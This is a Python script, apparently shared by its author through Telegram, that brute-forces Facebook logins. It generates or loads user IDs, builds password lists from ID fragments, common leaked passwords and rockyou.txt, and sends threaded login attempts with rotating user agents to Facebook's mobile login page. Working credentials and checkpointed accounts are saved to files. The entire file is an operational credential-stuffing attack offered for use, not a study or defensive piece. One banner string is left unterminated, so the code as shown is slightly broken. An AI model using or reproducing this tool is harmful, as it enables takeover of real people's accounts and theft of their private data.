#=====[🌿]CREATOR : MAAZ KING
#=====[🌿]TELEGRAM : @LabbaikSupport
import os
import sys
import uuid
import string
import random
import requests
from time import sleep
from concurrent.futures import ThreadPoolExecutor
import platform
from datetime import datetime
from threading import Lock

# ===== AUTO-INSTALL PACKAGES =====
try:
    import requests
except ImportError:
    os.system("pip install requests")
    import requests

# ===== COLOR CODES =====
R = '\x1b[38;5;196m'  # Red
G = '\x1b[38;5;46m'   # Green
Y = '\x1b[38;5;226m'  # Yellow
P = '\x1b[38;5;201m'  # Purple
W = '\x1b[0;97m'      # White
N = '\x1b[0m'         # Reset

GEO_PASS = ["123456", "786786", "pakistan", "12345678", "iloveyou", "112233", "123123"]
TOP_LEAKS = ["password", "qwerty", "111111", "123456789", "admin", "123123"]

USER_AGENTS = [
    "Mozilla/5.0 (Linux; Android 10...) Chrome/110.0.0.0 Mobile Safari/537.36",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 15_0...) Version/15.0 Mobile Safari/604.1",
    "Mozilla/5.0 (Windows NT 10.0...) Chrome/108.0.0.0 Safari/537.36"
]

class LogManager:
    @staticmethod
    def save(status, uid, pw):
        try:
            os.makedirs("results", exist_ok=True)
            date = datetime.now().strftime("%Y-%m-%d")
            with open(f"results/{status}-{date}.txt", "a") as f:
                f.write(f"{uid}|{pw}\n")
        except Exception as e:
            print(f"[!] Error saving log: {e}")

class MAAZTOOL:
    def __init__(self):
        self.oks, self.cps, self.generated_ids = [], [], []
        self.combo_pw_map = {}
        self.wordlist = self.load_passwords()
        self.lock = Lock()
        os.makedirs("results", exist_ok=True)

    def get_ua(self):
        return random.choice(USER_AGENTS)

    def is_login_successful(self, response):
        if "c_user" in response.cookies and "/home.php" in response.url:
            return True
        if "checkpoint" in response.url:
            return "CP"
        return False

    def load_passwords(self):
        paths = ["~/rockyou.txt", "rockyou.txt"]
        combined = []
        for path in paths:
            try:
                with open(os.path.expanduser(path), "r", encoding="utf-8", errors="ignore") as f:
                    combined.extend([line.strip() for line in f if line.strip()])
            except: continue
        combined.extend(GEO_PASS + TOP_LEAKS)
        return list(set(combined))

    def build_passwords(self, uid, method):
        uid = str(uid)
        uids = [uid, uid[:6], uid[-6:], uid[:5], uid[-5:]]
        base = []
        if method == "random":
            base = uids + GEO_PASS + TOP_LEAKS
        elif method == "business":
            base = uids + [uid+"123", uid+"786"] + GEO_PASS
        elif method == "dump":
            base = uids + self.wordlist[:30]
        elif method == "series":
            base = uids + ["786786", "112233", "123456"]
        return list(set(base))

    def api_crack(self, uid, pwlist, method):
        url = "https://m.facebook.com/login.php"
        for pw in pwlist:
            try:
                res = requests.post(url, data={"email": uid, "pass": pw}, headers={"User-Agent": self.get_ua()}, timeout=10)
                status = self.is_login_successful(res)
                if status == True:
                    with self.lock:
                        print(f"{G}[✓ OK] {uid} | {pw}{N}")
                        LogManager.save("ok", uid, pw)
                        self.oks.append(uid)
                    break
                elif status == "CP":
                    with self.lock:
                        print(f"{P}[~ CP] {uid} | {pw}{N}")
                        LogManager.save("cp", uid, pw)
                        self.cps.append(uid)
                    break
                else:
                    print(f"{W}[× FAIL] {uid} | {pw}{N}")
            except: continue

    def start_cloning(self, method):
        print(f"\n{G}Cloning ➤ {method.upper()} | Auto Threads{N}")
        if not self.generated_ids:
            print(f"{R}[!] No IDs generated. Exit.{N}")
            return
        thread_count = 10 if len(self.generated_ids) < 50 else 20 if len(self.generated_ids) < 200 else 30
        with ThreadPoolExecutor(max_workers=thread_count) as pool:
            for uid in self.generated_ids:
                if method == "combo":
                    pwlist = [self.combo_pw_map.get(uid)]
                else:
                    pwlist = self.build_passwords(uid, method)
                pool.submit(self.api_crack, uid, pwlist, method)
        self.summary()

    def summary(self):
        print(f"\n{G}Finished ➤ OKs: {len(self.oks)} | CPs: {len(self.cps)}{N}")

    def banner(self):
        os.system('cls' if platform.system() == 'Windows' else 'clear')
        print(f"""{G}
███████╗ █████╗ ███████╗███████╗
██╔════╝██╔══██╗╚══███╔╝██╔════╝
█████╗  ███████║  ███╔╝ █████╗  
██╔══╝  ██╔══██║ ███╔╝  ██╔══╝  
██║     ██║  ██║███████╗███████╗
╚═╝     ╚═╝  ╚═╝╚══════╝╚══════╝{N}\n")

    def menu(self):
        """Displays the main menu and handles user input for method selection."""
        self.banner()
        print(f"""{G}
[1]  Random Method
[2]  Business Method
[3]  Combo Method
[4]  Dump Method
[5]  Series Method
{N}""")
        try:
            choice = input(f"{Y}Select Option ➤ {G}")
        except EOFError:
            print(f"\n{R}[✗] No input provided. Exiting.{N}")
            sys.exit(0)
        methods = {
            '1': self.random_method,
            '2': self.business_method,
            '3': self.combo_method,
            '4': self.dump_method,
            '5': self.series_method
        }
        m = methods.get(choice)
        if m:
            m()
        else:
            print(f"{R}Invalid. Exit.{N}")

    def random_method(self):
        self.banner()
        try:
            limit = int(input(f"{Y}Enter ID Limit ➤ {G}"))
            prefix = ''.join(random.choices(string.digits, k=5))
            self.generated_ids = [prefix + ''.join(random.choices(string.digits, k=7)) for _ in range(limit)]
            self.start_cloning("random")
        except: pass

    def business_method(self):
        self.banner()
        try:
            domain = input(f"{Y}Enter domain ➤ {G}")
            limit = int(input(f"{Y}Enter Limit ➤ {G}"))
            self.generated_ids = [f"{''.join(random.choices(string.ascii_lowercase + string.digits, k=7))}@{domain}" for _ in range(limit)]
            self.start_cloning("business")
        except: pass

    def combo_method(self):
        self.banner()
        try:
            path = input(f"{Y}Path to combo.txt ➤ {G}")
            with open(path, "r") as f:
                for line in f:
                    if '|' in line:
                        uid, pw = line.strip().split('|')
                        self.generated_ids.append(uid)
                        self.combo_pw_map[uid] = pw
            self.start_cloning("combo")
        except: pass

    def dump_method(self):
        self.banner()
        try:
            path = input(f"{Y}Path to dump.txt ➤ {G}")
            with open(path, "r") as f:
                self.generated_ids = [line.strip() for line in f if line.strip()]
            self.start_cloning("dump")
        except: pass

    def series_method(self):
        self.banner()
        series_map = {'1': '100001', '2': '100002', '3': '100003'}
        print(f"{G}[1] 100001\n[2] 100002\n[3] 100003{N}")
        try:
            s = input(f"{Y}Choose Series ➤ {G}")
            prefix = series_map.get(s, '100001')
            limit = int(input(f"{Y}Enter ID Limit ➤ {G}"))
            self.generated_ids = [prefix + ''.join(random.choices(string.digits, k=7)) for _ in range(limit)]
            self.start_cloning("series")
        except: pass

if __name__ == '__main__':
    tool = MAAZTOOL()
    tool.menu()
